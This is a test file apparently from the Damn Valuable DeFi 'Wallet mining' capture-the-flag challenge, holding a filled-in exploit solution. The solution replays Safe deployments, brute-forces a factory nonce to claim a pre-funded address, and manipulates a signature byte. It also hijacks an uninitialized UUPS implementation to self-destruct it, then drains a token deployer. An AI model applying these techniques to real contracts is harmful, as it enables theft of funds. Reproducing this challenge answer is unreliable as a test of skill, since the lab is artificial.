const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Wallet mining', function () {
    let deployer, player;
    let token, authorizer, walletDeployer;
    let initialWalletDeployerTokenBalance;

    const DEPOSIT_ADDRESS = '0x9b6fb606a9f5789444c17768c6dfcf2f83563801';
    const DEPOSIT_TOKEN_AMOUNT = 20000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, ward, player] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy authorizer with the corresponding proxy
        authorizer = await upgrades.deployProxy(
            await ethers.getContractFactory('AuthorizerUpgradeable', deployer),
            [[ward.address], [DEPOSIT_ADDRESS]], // initialization data
            { kind: 'uups', initializer: 'init' }
        );

        expect(await authorizer.owner()).to.eq(deployer.address);
        expect(await authorizer.can(ward.address, DEPOSIT_ADDRESS)).to.be.true;
        expect(await authorizer.can(player.address, DEPOSIT_ADDRESS)).to.be.false;

        // Deploy Safe Deployer contract
        walletDeployer = await (await ethers.getContractFactory('WalletDeployer', deployer)).deploy(
            token.address
        );
        expect(await walletDeployer.chief()).to.eq(deployer.address);
        expect(await walletDeployer.gem()).to.eq(token.address);

        // Set Authorizer in Safe Deployer
        await walletDeployer.rule(authorizer.address);
        expect(await walletDeployer.mom()).to.eq(authorizer.address);

        await expect(walletDeployer.can(ward.address, DEPOSIT_ADDRESS)).not.to.be.reverted;
        await expect(walletDeployer.can(player.address, DEPOSIT_ADDRESS)).to.be.reverted;

        // Fund Safe Deployer with tokens
        initialWalletDeployerTokenBalance = (await walletDeployer.pay()).mul(43);
        await token.transfer(
            walletDeployer.address,
            initialWalletDeployerTokenBalance
        );

        // Ensure these accounts start empty
        expect(await ethers.provider.getCode(DEPOSIT_ADDRESS)).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.fact())).to.eq('0x');
        expect(await ethers.provider.getCode(await walletDeployer.copy())).to.eq('0x');

        // Deposit large amount of DVT tokens to the deposit address
        await token.transfer(DEPOSIT_ADDRESS, DEPOSIT_TOKEN_AMOUNT);

        // Ensure initial balances are set correctly
        expect(await token.balanceOf(DEPOSIT_ADDRESS)).eq(DEPOSIT_TOKEN_AMOUNT);
        expect(await token.balanceOf(walletDeployer.address)).eq(
            initialWalletDeployerTokenBalance
        );
        expect(await token.balanceOf(player.address)).eq(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        const data = require("./data.json");
        const ethDeployer = "0x1aa7451dd11b8cb16ac089ed7fe05efa00100a6a";

        // Send gas fees to eth deployer
        await player.sendTransaction({
            to: ethDeployer,
            value: ethers.utils.parseUnits("1", "ether")
        })

        await ethers.provider.sendTransaction(data["masterCopy"]);

        await ethers.provider.sendTransaction(data["randomTx"]);

        await ethers.provider.sendTransaction(data["factory"]);

        const createInterface = (signature, methodName, arguments) => {
            const ABI = signature;
            const IFace = new ethers.utils.Interface(ABI);
            const ABIData = IFace.encodeFunctionData(methodName, arguments);
            return ABIData;
        }

        const proxyFactoryAddress = await walletDeployer.fact();
        const masterCopyAddress = await walletDeployer.copy();

        let proxyFactory = (
            await ethers.getContractFactory('GnosisSafeProxyFactory', deployer)
        ).attach(proxyFactoryAddress);

        const safeABI = ["function setup(address[] calldata _owners, uint256 _threshold, address to, bytes calldata data, address fallbackHandler, address paymentToken, uint256 payment, address payable paymentReceiver)",
            "function execTransaction( address to, uint256 value, bytes calldata data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address payable refundReceiver, bytes calldata signatures)",
            "function getTransactionHash( address to, uint256 value, bytes memory data, Enum.Operation operation, uint256 safeTxGas, uint256 baseGas, uint256 gasPrice, address gasToken, address refundReceiver, uint256 _nonce)"];
        const setupABIData = createInterface(safeABI, "setup", [
            [player.address],
            1,
            ethers.constants.AddressZero,
            0,
            ethers.constants.AddressZero,
            ethers.constants.AddressZero,
            0,
            ethers.constants.AddressZero,
        ])

        let nonceRequired = 0
        let address = ""
        while (address.toLowerCase() != DEPOSIT_ADDRESS.toLowerCase()) {
            address = ethers.utils.getContractAddress({
                from: proxyFactoryAddress,
                nonce: nonceRequired
            });
            nonceRequired += 1;
        }

        for (let i = 0; i < nonceRequired; i++) {
            await proxyFactory.connect(player).createProxy(masterCopyAddress, setupABIData);
        }

        const tokenABI = ["function transfer(address to, uint256 amount)"];
        const tokenABIData = createInterface(tokenABI, "transfer", [player.address, DEPOSIT_TOKEN_AMOUNT]);

        const transactionParams = [
            token.address,
            0,
            tokenABIData,
            0,
            0,
            0,
            0,
            ethers.constants.AddressZero,
            ethers.constants.AddressZero,
            0
        ]

        let depositContract = (
            await ethers.getContractFactory('GnosisSafe', deployer)
        ).attach(DEPOSIT_ADDRESS);

        const transactionHash = await depositContract.getTransactionHash(...transactionParams)
        const signedTransaction = ethers.BigNumber.from(await player.signMessage(ethers.utils.arrayify(transactionHash))).add(4).toHexString();

        await depositContract.connect(player).execTransaction(
            token.address,
            0,
            tokenABIData,
            0,
            0,
            0,
            0,
            ethers.constants.AddressZero,
            ethers.constants.AddressZero,
            signedTransaction
        )

        const impSlot = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
        const impAddress = "0x" + (await ethers.provider.getStorageAt(authorizer.address, impSlot)).slice(-40);
        const impContract = await ethers.getContractAt("AuthorizerUpgradeable", impAddress, player);

        const attackContractFactory = await ethers.getContractFactory("AttackWalletMining", player);
        const attackContract = await attackContractFactory.connect(player).deploy();

        const attackABI = ["function attack()"];
        const attackEncodedCall = createInterface(attackABI, "attack", []);

        await impContract.connect(player).init([], []);
        await impContract.connect(player).upgradeToAndCall(attackContract.address, attackEncodedCall);

        for (let i = 0; i < 43; i++) {
            await walletDeployer.connect(player).drop(setupABIData);
        }

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Factory account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.fact())
        ).to.not.eq('0x');

        // Master copy account must have code
        expect(
            await ethers.provider.getCode(await walletDeployer.copy())
        ).to.not.eq('0x');

        // Deposit account must have code
        expect(
            await ethers.provider.getCode(DEPOSIT_ADDRESS)
        ).to.not.eq('0x');

        // The deposit address and the Safe Deployer contract must not hold tokens
        expect(
            await token.balanceOf(DEPOSIT_ADDRESS)
        ).to.eq(0);
        expect(
            await token.balanceOf(walletDeployer.address)
        ).to.eq(0);

        // Player must own all tokens
        expect(
            await token.balanceOf(player.address)
        ).to.eq(initialWalletDeployerTokenBalance.add(DEPOSIT_TOKEN_AMOUNT));
    });
});
